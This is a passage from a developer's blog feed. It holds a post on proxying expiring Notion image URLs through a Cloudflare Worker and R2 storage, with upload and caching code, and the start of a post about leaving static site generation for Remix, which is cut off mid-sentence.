Cloudflare Workers</title><link>https://macarthur.me/posts/serving-notion-presigned-images-with-cloudflare</link><guid isPermaLink="true">https://macarthur.me/posts/serving-notion-presigned-images-with-cloudflare</guid><pubDate>Mon, 12 Dec 2022 05:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I recently made a pretty big change on my website. For the first time ever, my posts don’t live in Markdown files. Instead, they’re all in Notion, the tool I’ve been using to draft posts for quite some time now. It’s nice being able to have a top-notch writing experience without the need to perform a clunky Markdown export when it’s finally time to publish.&lt;/p&gt;&lt;p&gt;Most of the migration was pretty boring &amp;amp; straightforward, but there was a particular piece of it that was interesting to navigate: &lt;strong&gt;serving images&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;If you look at the underlying URL of any image in Notion, you’ll notice it’s &lt;a href=&quot;https://docs.aws.amazon.com/AmazonS3/latest/userguide/using-presigned-url.html?ref=cms.macarthur.me&quot;&gt;presigned&lt;/a&gt;, and after a fixed number of hours has passed, that URL will expire. This posed a challenge. My site is statically generated with Next.js, and if I directly embedded those raw Notion links, my images would all cease to work after a while.&lt;/p&gt;&lt;p&gt;I needed a cheap solution that wouldn’t require a painfully complicated process to set up. Thankfully, CloudFlare has some handy tools in its suite for pulling this off.&lt;/p&gt;&lt;h2&gt;The P&lt;strong&gt;anacea that is Cloudflare&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;There are two distinct problems to solve here, each of which paired nicely with one of Cloudflare’s offerings.&lt;/p&gt;&lt;p&gt;First, whenever one of my pages containing images is viewed, I needed to intercept each image request in order to serve it from a location that’s &lt;em&gt;not&lt;/em&gt; Notion. A Cloudflare Worker is perfect for this job. Workers operate at the edge, so you can run server-side code with a similar level of performance as serving a static file from a CDN. Plus, the free tier is generous and the developer experience is buttery smooth.&lt;/p&gt;&lt;p&gt;Second, I needed a place to put those images before they’re served on my site. Not long ago, Cloudflare introduced a tempting alternative to Amazon’s S3 product — &lt;a href=&quot;https://www.cloudflare.com/products/r2/?ref=cms.macarthur.me&quot;&gt;R2 Object Storage&lt;/a&gt;. It touts zero egress fees (meaning it’s dirt cheap if you’re largely just reading static assets), and an API that’s fully compatible with S3 (bonkers). I knew this would mesh nicely with what I was aiming to do.&lt;/p&gt;&lt;h2&gt;The Build&lt;/h2&gt;&lt;p&gt;With these tools at my disposal, here’s how I set it up:&lt;/p&gt;&lt;h3&gt;Step #1: Upload images on site build.&lt;/h3&gt;&lt;p&gt;It’s nice that R2 is compatible with AWS, because all this meant was installing the &lt;code&gt;aws-sdk&lt;/code&gt;, configuring it with my Cloudflare access key, and setting up the code to upload images when my Next.js site is built. This process involved two main parts.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Determining Image Keys&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;First, I determined the key by which I’m save each image by hacking apart the URL embedded within my Notion posts. In raw form, they look something like this:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;https://s3.us-west-2.amazonaws.com/secure.notion-static.com/d527ddf8-acdc-4284-914d-8d4fefeda507/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;amp;X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&amp;amp;X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20221016%2Fus-west-2%2Fs3%2Faws4_request&amp;amp;X-Amz-Date=20221016T223440Z&amp;amp;X-Amz-Expires=86400&amp;amp;X-Amz-Signature=841d76d1a556204dc3d9c5a3d838913e3409224fe6d070a92fc9a9738918479e&amp;amp;X-Amz-SignedHeaders=host&amp;amp;response-content-disposition=filename%20%3D%22Untitled.png%22&amp;amp;x-id=GetObject
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I chose to use the random-looking string of characters immediately following the hostname. This would be the unique identifier by which I upload each image to R2:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function extractKey(imageUrl: string): string {
    const url = new URL(imageUrl);
    const parts = url.pathname.split(&quot;/&quot;);

    return parts[parts.length - 2];
}

const key = extractKey(
	&quot;https://s3.us-west-2.amazonaws.com/secure.notion-static.com/d527ddf8-acdc-4284-914d-8d4fefeda507/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;amp;X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&amp;amp;X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20221016%2Fus-west-2%2Fs3%2Faws4_request&amp;amp;X-Amz-Date=20221016T223440Z&amp;amp;X-Amz-Expires=86400&amp;amp;X-Amz-Signature=841d76d1a556204dc3d9c5a3d838913e3409224fe6d070a92fc9a9738918479e&amp;amp;X-Amz-SignedHeaders=host&amp;amp;response-content-disposition=filename%20%3D%22Untitled.png%22&amp;amp;x-id=GetObject&quot;
);

// key: 802f4ae5-100d-4ce1-9912-82fe84b11733
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Conditionally Upload Based on Key&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Once the key was determined, it was time for the upload itself, which I bypass if the upload has already occurred. I wrote a &lt;code&gt;StaticAssetService&lt;/code&gt; class to perform this work, which uses R2 as a &lt;code&gt;provider&lt;/code&gt; responsible for hosting those assets. The interesting part of that code looks like this. Feel free to &lt;a href=&quot;https://github.com/alexmacarthur/macarthur-me-next/blob/main/lib/StaticAssetService.ts?ref=cms.macarthur.me#L14&quot;&gt;dive in more here&lt;/a&gt;.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;async put(imageUrl: string, key: string): Promise&amp;lt;any&amp;gt; {
  try {
    // I&apos;ve already uploaded an image with this key! Don&apos;t do it again.
    if (await this.get(key)) {
      return Promise.resolve();
    }
  } catch (e) {
    console.error(`Retrieval failed! Key: ${key}, url: ${imageUrl}`);
  }

  try {
		// Upload the image!
    return this.provider.uploadImage({
      imageUrl,
      key,
    });
  } catch (e) {
    console.error(`Upload failed! Key: ${key}, url: ${imageUrl}`);
    return Promise.resolve();
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Important: Setting the Correct Content-Type&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;There’s one gotcha worth calling out regarding this process. By default, &lt;code&gt;binary/octet-stream&lt;/code&gt; is set as the content type upon upload (rather than something like &lt;code&gt;image/png&lt;/code&gt;), which would prevent the image from rendering when it’s finally served. The solution is to set that type on each upload, based on file you’re attempting to process. Here’s a closer look at that &lt;code&gt;uploadImage&lt;/code&gt; method:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;async uploadImage({ imageUrl, key }: { imageUrl: string; key: string }) {
    const res = await fetch(imageUrl);
    const blob = await res.arrayBuffer();

    return s3
      .upload({
        Bucket: BUCKET_NAME,
        Key: key,
        Body: Buffer.from(blob),

				// Set the correct `ContentType` here!
        ContentType: res.headers.get(&quot;Content-Type&quot;) as string,
      })
      .promise();
  }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A special shout-out is due to the participants of &lt;a href=&quot;https://github.com/SoftwareBrothers/adminjs-upload/issues/37?ref=cms.macarthur.me&quot;&gt;this GitHub issue&lt;/a&gt; for helping resolve this. With that piece in place, I can see every new upload appear in Cloudflare after I build my site:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/04f96ad6-2d26-4c7d-88de-91d78a7038e8-2.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;The entire process can be represented like so:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/510deb5d-e38c-4f46-9c82-bdfb2aa17dc0-2.webp&quot; alt=&quot;Uploading Images on Build&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;h3&gt;Step #2: Rewrite image URLs before generating HTML.&lt;/h3&gt;&lt;p&gt;You can only use a worker to intercept requests on &lt;em&gt;your own domain&lt;/em&gt; set up with Cloudflare. So, if I wanted to handle my images in a certain way when they’re requested (like swap them out with an image from R2), I’d need to make it &lt;em&gt;look&lt;/em&gt; like they belong to my domain before I build my HTML. I landed on transforming each presigned URL into a relative path with the following pattern: &lt;code&gt;/proxy/IMAGE_ID&lt;/code&gt;. My worker would then be configured to listen for requests to this path and do as I see fit.&lt;/p&gt;&lt;h3&gt;Writing the Pattern&lt;/h3&gt;&lt;p&gt;In order to perform this URL transformation, I used a regular expression that would swap out the presigned URL with my &lt;code&gt;/proxy/IMAGE_KEY&lt;/code&gt; path, using the image key I extracted earlier.&lt;/p&gt;&lt;p&gt;The image “block” I’d get from Notion each time is composed of normal Markdown, containing an optional “alt” description and the long, presigned URL.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;![alt description](https://very-very-long-presigned-image/url.jpg)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In order to preserve that description while I update the path, I used the following pattern:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;!\[(.*?)\]\((.*)\)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here’s a brief breakdown of that pattern:&lt;/p&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;strong&gt;Pattern Part&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;!\[(.*?)\]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Captures the “alt description” between square brackets, so I could preserve it in my updated markup.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;\(.*\)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Matches against the remaining URL between parentheses, in order to replace it with an updated path.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;p&gt;Finally, I used &lt;code&gt;.replace()&lt;/code&gt; to perform the operation:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;let key = keyExtractedEarlierInTheBuild();

let updatedMarkdownImage = originalMarkdownImage.replace(
	/!\[(.*?)\]\(.*\)/,
	`![$1](/proxy/${key})`
);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now that my images would all attempt to be requested from my own domain, I could finally set up a worker to intercept and pull them from R2.&lt;/p&gt;&lt;h3&gt;#3. Intercept Image Requests with a Worker&lt;/h3&gt;&lt;p&gt;One of the reasons this solution works so well is due to Cloudflare Workers’ first-class integration with R2. As such, the flow for my worker isn’t complex and can be visualized by the following sequence diagram:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/df80e01f-13f0-4c2d-9b5a-fd77b5a82ed8-2.webp&quot; alt=&quot;Sequence Diagram for Image Requests&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;In words, any given request is handled like so:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;For &lt;strong&gt;image requests&lt;/strong&gt; (those made to &lt;code&gt;/proxy/IMAGE_ID&lt;/code&gt;), intercept and return the the image by the embedded path ID from R2.&lt;/li&gt;&lt;li&gt;For &lt;strong&gt;all other requests,&lt;/strong&gt; allow the request to pass through to my site on Vercel.&lt;/li&gt;&lt;/ul&gt;&lt;h3&gt;Setting Up My Worker&lt;/h3&gt;&lt;p&gt;While you can write it directly in the browser, I chose to &lt;a href=&quot;https://developers.cloudflare.com/workers/get-started/quickstarts/?ref=cms.macarthur.me&quot;&gt;use Wangler&lt;/a&gt; to build &amp;amp; experiment with my worker locally. There’s a learning curve, but it’s minimal, and eased by the fact that Cloudflare Workers are built on the &lt;a href=&quot;https://developers.cloudflare.com/workers/runtime-apis/fetch/?ref=cms.macarthur.me&quot;&gt;fetch API&lt;/a&gt;. If you’ve spent a decent amount of time with it in the browser, it won’t take long to feel at home with it here too.&lt;/p&gt;&lt;p&gt;My worker is simple — consisting of only one “route,” set up with &lt;a href=&quot;https://github.com/kwhitley/itty-router?ref=cms.macarthur.me&quot;&gt;itty-router&lt;/a&gt;. Starting from scratch, it first looked something like this:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;import { Router } from &quot;itty-router&quot;;

const router = Router();

router.get(
  &quot;/proxy/:imageId&quot;,
  async (request: Request, env: AppEnv, ctx: ExecutionContext) =&amp;gt; {
		return new Response(&quot;hello&quot;);
  }
);

export default {
  async fetch(
    request: Request,
    env: AppEnv,
    context: ExecutionContext
  ): Promise&amp;lt;Response&amp;gt; {
		// If an exception is thrown, hit the origin server.
    context.passThroughOnException();

    return router.handle(request, env, context).then(response =&amp;gt; response);
  }
};
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When any request hits my worker, it’ll try to match against that &lt;code&gt;/proxy/:imageId&lt;/code&gt; endpoint. If it doesn’t, the request will be forwarded to the origin server like normal (in this case, Vercel, where my site is hosted). But if it does match, the request will be intercepted and returned with a &lt;code&gt;new Response()&lt;/code&gt;:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/c74c4615-26ca-4edc-a6b2-93b4201a652f-2.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;h3&gt;Retrieving an Image from R2&lt;/h3&gt;&lt;p&gt;After that, I took it to the next level by integrating with R2. Each request comes in with an &lt;code&gt;imageId&lt;/code&gt; that corresponds to an image that was previous uploaded to R2. Cloudflare makes it easy to connect a bucket of your choosing to your worker. That meant creating a binding in my &lt;code&gt;wrangler.toml&lt;/code&gt; file, which specifies the buckets I use in production &amp;amp; development:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;# ... the rest of my wrangler.toml

[[ r2_buckets ]]
binding = &apos;MACARTHUR_ME&apos;
bucket_name = &apos;macarthur-me&apos;
preview_bucket_name = &apos;macarthur-me-dev&apos;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then I could use that binding to fetch objects in my worker:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;import { Router } from &quot;itty-router&quot;;

interface AppEnv {
  MACARTHUR_ME: R2Bucket;
}

interface IRequest extends Request {
  method: &quot;GET&quot;;
  url: string;
  params: { imageId: string }
}

const router = Router();

router.get(
  &quot;/proxy/:imageId&quot;,
  async (request: IRequest, env: AppEnv, ctx: ExecutionContext) =&amp;gt; {
		const { imageId } = request.params;

		// Fetch the image by ID:
    const obj = await env.MACARTHUR_ME.get(imageId);

    if (!obj) {
      return new Response(`Image not found: ${imageId}`, { status: 404 });
    }

    return new Response(obj.body);
  }
);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After that, the result of my request yielded a different result:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/0519b74c-fc68-4b2a-bf28-145bc310b007-2.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;h3&gt;Setting up Client Headers&lt;/h3&gt;&lt;p&gt;After that, I just needed to adjust a couple headers on response sent to the browser. The first was “Content-Type,” which ensures that browsers can correctly serve images, and the second is “Cache-Control,” which tells clients they’re permitted to locally cache the image for up to a year.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;router.get(
  &quot;/proxy/:imageId&quot;,
  async (request: IRequest, env: AppEnv, ctx: ExecutionContext) =&amp;gt; {
    // ...

+   const response = new Response(obj.body);

+   const headers = {
+     &quot;Content-Type&quot;: obj.httpMetadata!.contentType as string,
+     &quot;Cache-Control&quot;: &quot;public, max-age=31560000&quot;,
+   };

+   const response = new Response(obj?.body, { headers });

    ctx.waitUntil(caches.default.put(cacheKey, response.clone()));

    return response;
  }
);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This met minimal needs, but it could be improved with one more small caching optimization…&lt;/p&gt;&lt;h3&gt;Setting up Object Caching&lt;/h3&gt;&lt;p&gt;In addition to being able to tell the client how to cache an asset, workers can leverage a proprietary cache provided by Cloudflare. It provides a simple key/value interface, which uses a (cloned) request as the cache key. When a request comes in, if we already have a response matching that request, we can return that. And if not, the image is fetched from R2 and stuck into the same cache for later.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;router.get(
  &quot;/proxy/:imageId&quot;,
  async (request: IRequest, env: AppEnv, ctx: ExecutionContext) =&amp;gt; {
    const { imageId } = request.params;

    // Create a cache key from existing request.
    const cacheKey = new Request(request.url.toString(), request);
    const cachedImage = await caches.default.match(cacheKey);

    if (cachedImage) {
      console.log(`Cache HIT for ${imageId}`);
      return cachedImage;
    }

    // ... other code for retrieving the image ...

    const response = new Response(obj.body, { headers });

    // Save the response to cache.
    ctx.waitUntil(caches.default.put(cacheKey, response.clone()));

    return response;
  }
);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It’s nothing world-changing, but should reduce the number of requests to my R2 bucket. And I’m all for some free micro-optimization.&lt;/p&gt;&lt;h2&gt;Just the Beginning&lt;/h2&gt;&lt;p&gt;This was my first experience dabbling with a Cloudflare Worker. Up until now, the use cases all felt pretty hypothetical. But now that I’ve personally found value in using one to solve a problem, I imagine it won’t be long before I reach for one again — especially with the &lt;a href=&quot;https://developers.cloudflare.com/workers/examples/?ref=cms.macarthur.me&quot;&gt;wide range of capabilities&lt;/a&gt; they empower.&lt;/p&gt;&lt;p&gt;If you’d like to dig into what’s here a little more, check out these links:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/alexmacarthur/macarthur-me-next?ref=cms.macarthur.me&quot;&gt;My Next Site&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/alexmacarthur/cloudflare-image-proxying?ref=cms.macarthur.me&quot;&gt;Image Proxying Worker&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Hoping this encourages you to try one out for yourself!&lt;/p&gt;</content:encoded></item><item><title>I’ve Boarded the SSG Train Again</title><link>https://macarthur.me/posts/boarded-the-ssg-train-again</link><guid isPermaLink="true">https://macarthur.me/posts/boarded-the-ssg-train-again</guid><pubDate>Fri, 07 Oct 2022 05:00:00 GMT</pubDate><content:encoded>&lt;p&gt;If you haven’t noticed, we’re in a bit of a server-rendered resurgence right now. It seems like the heyday of the Jamstack, and more specifically, static site generation (SSG) is behind us, and the pendulum is once again swinging toward more traditional paradigms. Namely: HTML that’s generated on demand/request rather than in advance.&lt;/p&gt;&lt;p&gt;Despite being somewhat of a Jamstack fanatic the past few years, I’m not mad about the shift. When it began picking up steam, SSG was pitched as a panacea for our biggest web development problems. It claimed to be superior in terms of performance, cost, and complexity, when it was really just a different tactic to meet these challenges.&lt;/p&gt;&lt;h2&gt;&lt;strong&gt;Different, Not Superior&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;Consider performance. With a good CDN &amp;amp; caching strategy, there’s nothing technical preventing a server-rendered site from being just as performant as a statically generated one. Modern caching policies like “&lt;a href=&quot;https://web.dev/stale-while-revalidate/?ref=cms.macarthur.me&quot;&gt;stale-while-revalidate&lt;/a&gt;” can even prevent a user from &lt;em&gt;ever&lt;/em&gt; hitting an uncached response, and are being supported by an increasing number of CDN providers. Sure, SSG has the advantage of being statically served &lt;em&gt;by default&lt;/em&gt;, but at the end of the day, the &lt;code&gt;&amp;lt;div&amp;gt;&lt;/code&gt;s are still shipped quickly &amp;amp; close to the user, regardless of when they’re generated.&lt;/p&gt;&lt;p&gt;Or, take complexity. SSG hype insisted its architecture inherently makes for simpler sites, since there’s no need to maintain a running server, database, and all the other infrastructure required to keep a site from folding under large amounts of traffic. In fact, Gatsby’s documentation &lt;a href=&quot;https://www.gatsbyjs.com/docs/glossary/static-site-generator/?ref=cms.macarthur.me#advantages-of-static-site-generators&quot;&gt;still makes that claim today.&lt;/a&gt; But that complexity hasn’t really gone anywhere — it’s just shifted. None of these components are whisked away when you move to an SSG. You’ll still need a database (or some other data source), infrastructure to build your code, and a web server to deliver it. The only difference is when most of it is used: on build or on request.&lt;/p&gt;&lt;h2&gt;The Understated Trade-Offs&lt;/h2&gt;&lt;p&gt;On top of that, this hype has often downplayed the inherent challenges of an SSG approach, with the most obvious one being the inability to serve dynamic content. There are, of course, ways to tackle this too, but they just lead to another layer of trade-offs.&lt;/p&gt;&lt;p&gt;For example, we could serve a static site and then fetch &amp;amp; render dynamic content on the client. But that means shipping more JavaScript, impacting metrics like &lt;a href=&quot;https://web.dev/fid/?ref=cms.macarthur.me&quot;&gt;first input delay&lt;/a&gt; and increasing the number of bytes users needs to download, parse, &amp;amp; execute before they can even access any of your content. At best, the shell of your site will load quickly, but seeing any meaningful content may still be a long way off. Plus, a site depending on JavaScript to render will inevitably run into SEO difficulties.&lt;/p&gt;&lt;p&gt;Build time is another big one. Depending on the generator, the amount of content on your site, and several other factors, committing to an SSG means being ready to wait for &lt;em&gt;the entire site&lt;/em&gt; to build in order to update or publish anything. Platforms like Vercel and Gatsby (probably others now too) have skirted this by introducing incremental generation features, but it isn’t the norm across all platforms, and certainly not a table stakes feature for any given SSG (yet). And for that reason, making such a move requires you to ask, at minimum: “Do I have the sort of site that can afford to wait for a build to complete before my content will be available?”&lt;/p&gt;&lt;p&gt;There’s much more I could belabor here. The point is that SSGs haven’t become the WD-40 of our problems, and I think most people are starting to more clearly see that (including myself).&lt;/p&gt;&lt;h2&gt;An Itch to Try Something New&lt;/h2&gt;&lt;p&gt;My own site’s been built with a few different SSGs over time, including Jekyll, Gatsby, and Next.js. I’ve had neither complex needs nor a ton of content, and so the paradigm’s been a great fit. But a few months ago, when that vibe started to shift and I was more commonly pondering all of the aforementioned thoughts, I began to wonder if I should take a stab at building the next iteration with a server-rendered framework. At the time, Remix was relatively new, open-sourced, and had a ton of Twitter energy around it. I bit and &lt;a href=&quot;https://twitter.com/amacarthur/status/1519089857829736448?ref=cms.macarthur.me&quot;&gt;committed to using it for my site&lt;/a&gt;.&lt;/p&gt;&lt;h3&gt;My Priorities&lt;/h3&gt;&lt;p&gt;I went into the rebuild with a few priorities in mind:&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Performance/Caching&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;I take pride in how fast a site I’ve built loads when it’s hosted on SSG-friendly platforms like Vercel and Netlify, and so this was a cold, hard requirement for me. If I was gonna switch, I’d &lt;em&gt;need&lt;/em&gt; to have SSG-like performance, preferably using &lt;code&gt;stale-while-revalidate&lt;/code&gt; on Cloudflare (the number of CDNs that support this policy is still depressingly low, but thankfully, Cloudflare’s incredible and I had already been using them for other things). And this caching couldn’t be flaky. I wanted almost &lt;em&gt;no cache misses&lt;/em&gt; after first request, as well as the confidence it was &lt;em&gt;actually&lt;/em&gt; happening.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Content Management&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Ever since I’ve been blogging, I’ve used Markdown files to store my content, all stuck directly in my repository. I’ve appreciated how simple it is, as well as the fact that I don’t need to worry about a dedicated CMS as a dependency. I also really like writing in Markdown.&lt;/p&gt;&lt;p&gt;But over time, the clunkiness of publishing a new post became a little too annoying. I’d draft my posts in Notion (a really nice writing experience), and when I was ready, I’d perform a full export into a Markdown file. Finally, I’d stick it and any images into my repository. The number of steps it took to launch a new post became a hindrance to me publishing anything at all. If I were to rebuild, I wanted to give a big upgrade to my writing experience along the way.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Cost&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Platforms like Vercel and Netlify are too good to us. They make it disgustingly easy to stand up a high-performance site with a ton of serverless bells &amp;amp; whistles &lt;em&gt;for free&lt;/em&gt; (they both have very generous free tiers). I didn’t want to introduce another bill into my technological ecosystem if I didn’t have to (subscription fatigue is real), so if I were to move to something else, I wanted to find some reputable platform with a similar model. Cheap, but good.&lt;/p&gt;&lt;h2&gt;The Rebuild Experience&lt;/h2&gt;&lt;p&gt;With these priorities in mind, it wasn’t hard to nail down the rest of the stack I’d use for my new Remix site:&lt;/p&gt;&lt;h3&gt;Hosting: Fly.io&lt;/h3&gt;&lt;p&gt;I’d been hearing really good things about &lt;a href=&quot;https://fly.io/?ref=cms.macarthur.me&quot;&gt;Fly&lt;/a&gt; from the likes of &lt;a href=&quot;https://kentcdodds.com/?ref=cms.macarthur.me&quot;&gt;Kent C. Dodds&lt;/a&gt; and other big names in the space for quite a while, and so I had a pretty decent bank of trust built up with them, even though I had never used them. Plus, they let you deploy two apps for free, satisfying that “cost” priority.&lt;/p&gt;&lt;h3&gt;Caching: Cloudflare&lt;/h3&gt;&lt;p&gt;As mentioned, I had been happily using Cloudflare for quite some time, and it’s one of the few CDN providers I’ve come across that supports &lt;code&gt;staile-while-revalidate&lt;/code&gt;. I also wanted to reserve the ability to use their &lt;a href=&quot;https://workers.cloudflare.com/?ref=cms.macarthur.me&quot;&gt;Workers&lt;/a&gt; product if it became helpful for whatever reason (and it did, but that’s a post for another time).&lt;/p&gt;&lt;h3&gt;CMS: Notion&lt;/h3&gt;&lt;p&gt;As mentioned, I’d been using Notion to draft my posts for a while. Aside from the nice writing experience, it supports Markdown, including code blocks for several different languages. The timing also felt right being that their official API had recently been opened up, and supported by official SDKs. I didn’t know what to expect from a performance standpoint, but I was hoping my caching strategy would prevent any issues from being experienced by my visitors.&lt;/p&gt;&lt;h2&gt;Where Things Got Hard&lt;/h2&gt;&lt;p&gt;Overall, I really enjoyed building out the site. Remix offers a pretty good developer experience, is well-documented, and I enjoyed how it leans into web standards. There were, however, a couple of things that started to make me wonder if it was worth finishing the effort.&lt;/p&gt;&lt;h3&gt;Deployment&lt;/h3&gt;&lt;p&gt;Getting my site stood up on &lt;a href=&quot;http://fly.io/?ref=cms.macarthur.me&quot;&gt;Fly.io&lt;/a&gt; wasn’t monumentally difficult, but there was some notable friction. Most of my issues on that front involved tweaking my Docker image after ripping out a ton of stuff provided to me by the &lt;a href=&quot;https://github.com/remix-run/indie-stack?ref=cms.macarthur.me&quot;&gt;Indie Stack&lt;/a&gt; I chose. It’s very possible I could’ve gone another route (maybe no stack at all) and had a smoother experience.&lt;/p&gt;&lt;p&gt;But the other pain point here was getting it wired up to automatically deploy when I pushed a change to GitHub. The &lt;a href=&quot;https://github.com/alexmacarthur/macarthur-me-remix/blob/master/.github/workflows/deploy.yml?ref=cms.macarthur.me&quot;&gt;stack I chose&lt;/a&gt; came with a workflow, but it didn’t “just work,” which is something I got quite accustomed to when working with Vercel and Netlify. I realize these aren’t apples-to-apples comparisons here. Remix is a very different type of application compared to what I had been using. But still, being spoiled for so long with my SSG sites made it less than fun to wade into something else.&lt;/p&gt;&lt;h3&gt;Caching&lt;/h3&gt;&lt;p&gt;I mentioned that caching was my top priority in rebuilding my site. I went into the migration pretty optimistic about meeting that priority. Setting up Cloudflare was easy, as expected, as was configuring the headers on my site, which looked like this:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;// Consider stale after 1 hour, but serve stale &amp;amp; refresh cache for 6 months.
responseHeaders.set(
   &quot;Cache-Control&quot;,
   &quot;public, max-age=3600, s-maxage=3600, stale-while-revalidate=15780000&quot;
);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Based on that header, I expected my content be served straight from the CDN for up to one hour. After that, it would go “stale,” but Cloudflare would still serve that stale cache for up to six months later. And whenever it did serve that stale content, it would refresh the cache behind the scenes. So, as long as people keep visiting a page at least once every six months, &lt;em&gt;no one&lt;/em&gt; would ever experience a slow, uncached response.&lt;/p&gt;&lt;p&gt;But that’s not what happened. I started inspecting the response headers shortly after I deployed these changes. It would return a “HIT,” meaning the page was successfully served from Cloudflare’s cache:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/4d59f486-119b-4885-9961-b392a15e9fb7-2.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;But then, shortly later (if I remember correctly, it was maybe just an hour or so), refreshing that page would result in a “MISS”:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/f433efe1-9002-4cac-92fb-2217b507a22c-2.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;It got pretty frustrating as it continued to occur, but things became a little clearer after Googling around. As it turns out, Cloudflare and other CDNs make no guarantee as to how long they will actually cache a resource. Those time values I used in my headers were really just the maximum amount of time Cloudflare &lt;em&gt;is permitted&lt;/em&gt; do it. No promises are made beyond that.&lt;/p&gt;&lt;p&gt;It’s hard to find any official documentation on all of this, but it appears that Cloudflare will commonly use this distinction to &lt;a href=&quot;https://community.cloudflare.com/t/getting-cache-miss-after-24-hours-even-though-headers-are-set-to-cache-longer/260526?ref=cms.macarthur.me&quot;&gt;purge infrequently accessed resources&lt;/a&gt;, making it a bigger concern for smaller, personal sites like my own.&lt;/p&gt;&lt;p&gt;Sifting more, it apparently&lt;a href=&quot;https://community.cloudflare.com/t/cache-everything-is-not-guaranteed/180269/5?ref=cms.macarthur.me&quot;&gt; isn’t a new thing for Cloudflare&lt;/a&gt;, and may very well be tied to how differs itself as a full-on reverse proxy, rather than strictly a static file host. It did cross my mind that it might behave differently for paid plans, but I didn’t do enough digging to figure out if it does.&lt;/p&gt;&lt;p&gt;As I was piecing this together from various personal experiences and forums on the internet, it slowly became clear I wouldn’t have the level of confidence in caching I wanted. Instead, I’d need to explore other CDN offerings that explicitly support more permanent, longer-term caching, or else risk several requests needing to wait for a full response from Notion before showing any content.&lt;/p&gt;&lt;p&gt;Of the alternatives I came across, &lt;a href=&quot;https://bunny.net/cdn/?ref=cms.macarthur.me&quot;&gt;Bunny&lt;/a&gt; seemed the most interesting. Not only do they clearly tout permanent caching (“Perma-Cache,” as they call it), they also appear to support an off-brand version of 